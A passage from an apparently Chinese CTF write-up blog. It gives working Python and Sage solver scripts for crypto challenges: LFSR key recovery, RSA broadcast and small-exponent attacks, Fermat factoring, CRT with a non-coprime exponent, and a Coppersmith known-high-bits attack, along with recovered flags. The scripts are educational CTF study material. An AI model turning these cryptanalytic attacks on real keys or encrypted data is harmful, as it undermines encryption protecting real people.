range(dim):</span><br><span class="line">            <span class="keyword">if</span> magic[i][j] == <span class="number">1</span> <span class="keyword">and</span> i != j:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(dim):</span><br><span class="line">                    magic[i][k] ^= magic[j][k]</span><br><span class="line">                cipher[i] ^= cipher[j]</span><br><span class="line">    <span class="keyword">return</span> int(<span class="string">''</span>.join(map(str, cipher)), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFSR_inv</span><span class="params">(R, mask)</span>:</span></span><br><span class="line">    str = bin(R)[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">    new = str[<span class="number">-1</span>:] + str[:<span class="number">-1</span>]</span><br><span class="line">    new = int(new, <span class="number">2</span>)  <span class="comment"># R循环右移一位得到new</span></span><br><span class="line">    i = (new &amp; mask) &amp; (<span class="number">2</span> ** <span class="number">257</span> - <span class="number">1</span>)</span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> R &gt;&gt; <span class="number">1</span> | lastbit &lt;&lt; <span class="number">255</span>  <span class="comment"># 最高位用lastbit填充</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span><span class="params">(stream)</span>:</span></span><br><span class="line">    mask = get_mask(stream)</span><br><span class="line">    c = int(stream[:<span class="number">256</span>], <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        c = LFSR_inv(c, mask)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> itertools.product(<span class="string">"01"</span>, repeat=<span class="number">8</span>):</span><br><span class="line">    stream = data + <span class="string">""</span>.join(s)</span><br><span class="line">    KEY = get_key(stream)</span><br><span class="line">    flag = hashlib.sha256(hex(KEY)[<span class="number">2</span>:].rstrip(<span class="string">'L'</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> flag[:<span class="number">4</span>] == <span class="string">"1224"</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"de1ctf&#123;"</span> + flag + <span class="string">"&#125;"</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"not "</span>, i</span><br><span class="line">        i += <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f8ed62efc7cc0aa4.png" alt="image.png"></p><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>套娃一样，题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> e1,e2,p,q1p,q1q,hint,flag</span><br><span class="line"></span><br><span class="line">n =  [<span class="number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L</span>, <span class="number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L</span>, <span class="number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L</span>, <span class="number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L</span>]</span><br><span class="line">c =  [<span class="number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L</span>, <span class="number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L</span>, <span class="number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L</span>, <span class="number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L</span>]</span><br><span class="line">f=<span class="keyword">lambda</span> m,e,n,c:pow(m,e,n)==c</span><br><span class="line"><span class="keyword">assert</span>(sum(map(f,[p]*<span class="number">4</span>,[<span class="number">4</span>]*<span class="number">4</span>,n,c))==<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">ee1 = <span class="number">42</span></span><br><span class="line">ee2 = <span class="number">3</span></span><br><span class="line">ce1 =  <span class="number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span></span><br><span class="line">ce2 =  <span class="number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span></span><br><span class="line">tmp =  <span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span></span><br><span class="line">n  =  <span class="number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span></span><br><span class="line"><span class="keyword">assert</span>(pow(e1,ee1,n)==ce1)</span><br><span class="line"><span class="keyword">assert</span>(pow(e2+tmp,ee2,n)==ce2)</span><br><span class="line"></span><br><span class="line">e = <span class="number">46531</span></span><br><span class="line">n = <span class="number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span></span><br><span class="line">c = <span class="number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span></span><br><span class="line">hint=int(binascii.hexlify(hint),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">assert</span>(q1p*q1q==n)</span><br><span class="line"><span class="keyword">assert</span>(q1p&lt;q1q)</span><br><span class="line"><span class="keyword">assert</span>(c==pow(hint,e,n))</span><br><span class="line"></span><br><span class="line">flag=int(binascii.hexlify(flag),<span class="number">16</span>)</span><br><span class="line">q1=q1p</span><br><span class="line">q2 =  <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">c1 =  <span class="number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span></span><br><span class="line">c2 =  <span class="number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span></span><br><span class="line"><span class="keyword">assert</span>(c1==pow(flag,e1,p*q1))</span><br><span class="line"><span class="keyword">assert</span>(c2==pow(flag,e2,p*q2))</span><br></pre></td></tr></table></figure><p>先求p，四组明密文，e=4，直接广播攻击。</p><p>往下看，ee1=42，直接密文开42次方发现就可以了，ee2=3，这么小，直接c+i*n 开三次方爆破。</p><p>再往下看，e=46531，n是2048 bit，没啥特点，猜想p和q过于接近，使用wiki上的思想，成功分解n：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-d0cdaa9f80b10a9a.png" alt="image.png"></p><p>解出hint：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orz...you.found.me.but.sorry.no.hint...keep.on.and.enjoy.it!</span><br></pre></td></tr></table></figure><p>emmmm</p><p>往下看，最终的flag部分，同一个flag用不同的n和e加密，e与phi的最大公因数是14，不互素，一下想起了 2018 EIS 高校运维挑战赛的一道题目，如出一辙。</p><p>基本思想就是 e与p-1的最大公因数是14，导致最多能搞到 flag**14 mod n，没法往下搞，由于两个n分别是 p*q1,p*q2,我们可以利用中国剩余定理，求出 flag ** 14 (mod p*q1*q2) 进而求出 flag**14 (mod q1<em>q2)，发现14 与 (q1-1)\</em>(q2-1) 的最大公因数是2，我们得到 flag**2 mod (q1*q2)，开方即可。</p><p>最终exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(解,最小公倍数)</span></span><br><span class="line">n =  [<span class="number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L</span>, <span class="number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L</span>, <span class="number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L</span>, <span class="number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L</span>]</span><br><span class="line">c =  [<span class="number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L</span>, <span class="number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L</span>, <span class="number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L</span>, <span class="number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L</span>]</span><br><span class="line">p = gmpy2.iroot(GCRT(n,c)[<span class="number">0</span>],<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">n= <span class="number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span></span><br><span class="line">ce1=<span class="number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span></span><br><span class="line">e1 = gmpy2.iroot(ce1,<span class="number">42</span>)[<span class="number">0</span>]</span><br><span class="line">ce2=<span class="number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span></span><br><span class="line">tmp=<span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span></span><br><span class="line">e2=<span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449290342499311738517</span>-tmp</span><br><span class="line"></span><br><span class="line">n = <span class="number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span></span><br><span class="line">c = <span class="number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span></span><br><span class="line">e = <span class="number">46531</span></span><br><span class="line">l = gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">x = <span class="number">127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088835282</span></span><br><span class="line">y = gmpy2.iroot(x*x-n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">q1p=x-y</span><br><span class="line">q1q=x+y</span><br><span class="line"><span class="keyword">print</span> n2s(pow(c,gmpy2.invert(e,(q1p<span class="number">-1</span>)*(q1q<span class="number">-1</span>)),n))</span><br><span class="line"></span><br><span class="line">q1=q1p</span><br><span class="line">q2 =  <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">c1 =  <span class="number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span></span><br><span class="line">c2 =  <span class="number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span></span><br><span class="line"></span><br><span class="line">c11 = pow(c1,gmpy2.invert(e1/<span class="number">14</span>,(p<span class="number">-1</span>)*(q1<span class="number">-1</span>)),p*q1)</span><br><span class="line">c22 = pow(c2,gmpy2.invert(e2/<span class="number">14</span>,(p<span class="number">-1</span>)*(q2<span class="number">-1</span>)),p*q2)</span><br><span class="line"></span><br><span class="line">M,C = GCRT([p*q1,p*q2],[c11,c22])</span><br><span class="line"></span><br><span class="line">new_c = M%(q1*q2)</span><br><span class="line">new_n = q1*q2</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> n2s(gmpy2.iroot(pow(new_c,gmpy2.invert(<span class="number">7</span>,(q1<span class="number">-1</span>)*(q2<span class="number">-1</span>)),new_n),<span class="number">2</span>)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><blockquote><p>de1ctf{9b10a98b-71bb-4bdf-a6ff-f319943de21f}</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 强网杯 wp</title>
      <link href="/2019/05/27/2019%20%E5%BC%BA%E7%BD%91%E6%9D%AF%20wp/"/>
      <url>/2019/05/27/2019%20%E5%BC%BA%E7%BD%91%E6%9D%AF%20wp/</url>
      
        <content type="html"><![CDATA[<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="COPPERSTUDY"><a href="#COPPERSTUDY" class="headerlink" title="COPPERSTUDY"></a>COPPERSTUDY</h3><p>俄罗斯套娃一样的题目，和去年一样，今年是考 Coppersmith 相关攻击，主要参考ctf wiki <a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_coppersmith_attack/#known-high-bits-message-attack" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_coppersmith_attack/#known-high-bits-message-attack</a></p><p>github：<a href="https://github.com/mimoo/RSA-and-LLL-attacks" target="_blank" rel="noopener">https://github.com/mimoo/RSA-and-LLL-attacks</a></p><p>第一关：</p><a id="more"></a><p>已知明文的高位，低72位不知道，从<a href="https://github.com/mimoo/RSA-and-LLL-attacks" target="_blank" rel="noopener">https://github.com/mimoo/RSA-and-LLL-attacks</a> 这里找的脚本，改的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">N=<span class="number">0x8d28bda1fbb8190dd9f530c6c8b388f74749a2a957092bef9bb0d3439950aa22cb1638dd09eee5e08fb5da22d5d063f69b7e2aa087041eea9c9d78440e2abc0b9f5c922f30d69a2bce2416df4f9c5383adac8e933bd10c6cf56352db8e46cc65fc5b8109def1f91d553610a3b05e8c0f66d917c4c47fc04297b8e1817cf84dL</span></span><br><span class="line">length_N = <span class="number">1016</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">Kbits = <span class="number">72</span></span><br><span class="line">ZmodN = Zmod(N)</span><br><span class="line">C=<span class="number">0x57916d30c7568749b98f0f688bf80c2cd0d3394039b4b3485aa6c094a269f13ee0dec44bc03c5ce5ff2e43384252f3ea658a88f8fc3e90dd022da6842579a6fc1e0adf19323c1188647845b9b938b7610684bab06eae88e40892aaea5503bc1ea5066a4cfc69c08c576d08fa69f28c888afb94b0dd882acd45c6ace2bc49c4L</span></span><br><span class="line">part_m=<span class="number">0x81db7350876267d03e36e3dd70129e08167e715c6508ac4ee1afbd4992ad0ac8a5021ab1c084f8b087ab72a155989816a263213d62449000000000000000000L</span></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(ZmodN) <span class="comment">#, implementation='NTL')</span></span><br><span class="line">pol = (part_m + x)^e - C</span><br><span class="line">dd = pol.degree()</span><br><span class="line"></span><br><span class="line">beta = <span class="number">1</span>                                <span class="comment"># b = N</span></span><br><span class="line">epsilon = beta / <span class="number">7</span>                      <span class="comment"># &lt;= beta / 7</span></span><br><span class="line">mm = ceil(beta**<span class="number">2</span> / (dd * epsilon))     <span class="comment"># optimized value</span></span><br><span class="line">tt = floor(dd * mm * ((<span class="number">1</span>/beta) - <span class="number">1</span>))    <span class="comment"># optimized value</span></span><br><span class="line">XX = ceil(N**((beta**<span class="number">2</span>/dd) - epsilon))</span><br><span class="line"></span><br><span class="line">start_time = time.time()</span><br><span class="line">roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)</span><br><span class="line"></span><br><span class="line">result=part_m+roots[<span class="number">0</span>]</span><br><span class="line"><span class="comment">##result=425073431519458914714078012425419177266636080842324683032155837727713301740606335541361888317818841093831762175806435562415181409265511020138003062793538</span></span><br></pre></td></tr></table></figure><p>第二关：</p><p>已知 p 高位攻击，xman 排位赛靠这题翻盘的。。直接拿脚本来用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 